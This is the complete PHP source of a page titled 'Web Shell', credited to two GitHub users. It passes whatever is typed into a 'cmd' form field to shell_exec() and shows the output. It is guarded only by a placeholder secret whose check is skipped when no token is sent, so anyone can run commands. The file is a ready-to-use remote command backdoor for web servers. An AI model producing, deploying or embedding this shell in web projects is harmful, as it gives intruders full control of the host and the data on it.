<?php
if (!empty($_POST['access'])) {
    $access = htmlspecialchars($_POST['access'], ENT_QUOTES, 'UTF-8');
    $secret = '<Enter Your Secret Here>'; // Insert your secret here
    if($access !== $secret){
        echo "Unauthorized Access";
        exit(0);
    }
}
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE html>
<html>
<!-- By Artyum (https://github.com/artyuum) -->
<!-- Updated by Rifqihz (https://github.com/rifqihz) -->
<head>

    <meta charset="utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">

    <title>Web Shell</title>

    <style>
        h2 {
            color: rgba(0, 0, 0, .75);
        }
        pre {
            padding: 15px;
            -webkit-border-radius: 5px;
            -moz-border-radius: 5px;
            border-radius: 5px;
            background-color: #ECF0F1;
        }
        .container {
            width: 850px;
        }
    </style>

</head>

<body>

    <div class="container">

        <div class="pb-2 mt-4 mb-2">
            <h2> Execute a command </h2>
        </div>

        <form method="POST">
            <div class="form-group">
                <label for="cmd"><strong>Command</strong></label>
                <input type="text" class="form-control" name="cmd" id="cmd" value="<?= !empty($cmd) ? htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') : '' ?>" placeholder="command" required>
                <label for="access"><strong>Access Token    </strong></label>
                <input type="text" class="form-control" name="access" id="access" value="<?= !empty($cmd) ? htmlspecialchars($_POST['access'], ENT_QUOTES, 'UTF-8') : '' ?>" placeholder="secret" required>
            </div>
            <button type="submit" class="btn btn-primary">Execute</button>
        </form>


        <div class="pb-2 mt-4 mb-2">
            <h2> Output </h2>
            <?php if (empty($cmd)): ?>
                <pre><small>No result.</small></pre>
            <?php elseif (!empty($cmd) && $_SERVER['REQUEST_METHOD'] == 'POST'): ?>
                <pre><?= htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
            <?php endif; ?>        

        </div>
    </div>

</body>

</html>
